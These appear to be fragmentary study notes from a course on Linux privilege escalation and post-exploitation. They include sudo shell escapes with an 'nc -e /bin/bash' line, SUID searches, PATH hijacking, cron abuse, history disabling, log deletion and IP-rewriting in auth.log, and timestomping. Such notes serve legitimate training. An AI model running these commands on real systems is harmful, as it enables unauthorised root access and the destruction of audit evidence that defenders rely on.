```shell

sudo -l
sudo apt-get 
    !/bin/sh
    nc -e /bin/bash localhost
    # https://gtfobins.github.io/

#The find command is likely the best tool for finding binaries that are SGID or SUID:
find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files

strings /bin/netstat_natpu | grep netstat
/bin/ls /bin | /bin/grep "ls" #this will find the commands that ls can do
ls . # the . just means the current working directory

# since an enviormental variable can be altered
echo $PATH
nano netstat
chmod +x netstat
/bin/netstat_natpu
#altered path statement to look into current working directory to run a program as admin
cat /tmp/sudoers
# % means group
```
# DEMO
```shell
sudo -l 
# /bin/cat & /var/log/syslog*
ls /var/log 
sudo /bin/cat /var/log/syslog.1
sudo -l 
export PATH=.:$PATH
nano ls
chmod +x ls
ls

* * * * * ddwedwed 
# now looking at weekly crontabs
nano /etc/cron.d/mdadm

#dot in the path, will look for binary in present working directory

uname -a # get kernel version of linux

#crontabs will persist after system shutdown

Kernel Backdoors
```
# Plan
prior, before, then
- unset HISTFILE
# INIT type
```shell
ls -latr /proc/1/exe
stat /sbin/init
man init
init --version
ps 1
```
# Audinting SystemV
```shell
# ausearch: Pulls from audit.log
ausearch -p 22
ausearch -m USER_LOGIN -sv no
ausearch -ua edwards -ts yesterday -te now -i

# Utilzes journalctl`
journalctl _TRANSPORT=audit
journalctl _TRANSPORT=audit | grep 603

# Logs for Covering Tracks
auth.log/secure	Logins/authentications
lastlog #Each users' last successful login time 
btmp #Bad login attempts
sulog #Usage of SU command
utmp #Currently logged in users (W command)
wtmp #Permanent record on user on/off

# Working wiht Logs
file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4

#Reading files
cat /var/log/auth.log | egrep -v "opened|closed"
awk '/opened/' /var/log/auth.log
last OR lastb OR lastlog
strings OR dd            # for data files
more /var/log/syslog
head/tail
# Control your output with pipes | and more

#Cleaning Logs General
# REMOVE
rm -rf /var/log/...
# CLEAR IT
cat /dev/null > /var/log/...
echo > /var/log/...

#Precise Log Clearing
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log

grep -rl auth /home/usacys/Downloads/auth.log | xargs sed -i 's/172.16.34.4/192.168.1.103/g'

# Timestomp
touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference
```
# Remote Logging
```shell
# Newer Rsyslog references 
/etc/rsyslog.d/* for settings/rules
# Older version only uses 
/etc/rsyslog.conf`
#Find out
grep "IncludeConfig" /etc/rsyslog.conf

# Reading Rsyslog
<facility>.<priority>







